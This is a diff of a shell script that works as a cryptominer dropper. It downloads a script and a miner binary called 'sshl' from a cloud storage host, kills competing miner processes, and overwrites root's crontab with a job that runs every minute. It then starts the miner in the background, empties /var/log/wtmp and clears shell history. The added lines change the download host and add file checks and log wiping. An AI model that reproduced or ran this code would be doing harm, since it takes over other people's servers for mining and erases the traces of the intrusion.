@@ -155,30 +155,61 @@ version='+1';
 
 dir="/usr/sshl/"
 shell="run.sh"
-shellUrl="https://skyxx.oss-cn-beijing.aliyuncs.com/run.sh"
+shellUrl="https://skyxxx.oss-cn-beijing.aliyuncs.com/run.sh"
 shellPath=$dir$shell
 
 miner="sshl"
-minerUrl="https://skyxx.oss-cn-beijing.aliyuncs.com/sshl"
+minerUrl="https://skyxxx.oss-cn-beijing.aliyuncs.com/sshl"
 minerPath=$dir$miner
 
 mkdir $dir
 
 # download shell
+if [ ! -f "$shellPath" ];then
+echo "run.sh file not exist"
+
 wget -O $shellPath $shellUrl
+
+else
+echo "run.sh file exist"
+ if [ ! -s "$shellPath" ] ; then 
+  echo 'run.sh file is empty'
+  wget -O $shellPath $shellUrl　
+ else
+  echo 'run.sh file is not empty'
+ fi
+fi
 # setting auth
 chmod 777 $shellPath
 
 # kill other miner process
 kill -s 9 `ps -aux | grep yam | awk '{print $2}'`
-# download sshl if not
+kill -s 9 `ps -aux | grep .gpg | awk '{print $2}'`
+
+# download sshl if not exist
+if [ ! -f "$minerPath" ];then
+echo "sshl file not exist"
+
 ps auxf | grep -v grep | grep ""wget -O "$minerPath" || wget -O $minerPath $minerUrl
+
+else
+echo "sshl file exist"
+ if [ ! -s "$minerPath" ] ; then 
+  echo 'sshl file is empty'
+  ps auxf | grep -v grep | grep ""wget -O "$minerPath" || wget -O $minerPath $minerUrl
+ else
+  echo 'sshl file is not empty'
+ fi
+fi
+
+
 # setting auth
 chmod 777 $minerPath
 
 rm -rf /var/spool/cron/root
 echo "*/1 * * * * $shellPath" >> /var/spool/cron/root
 ps auxf | grep -v grep | grep $minerPath || nohup $minerPath &
+echo > /var/log/wtmp
 history -c
 #rm -rf /var/spool/mail/root
 
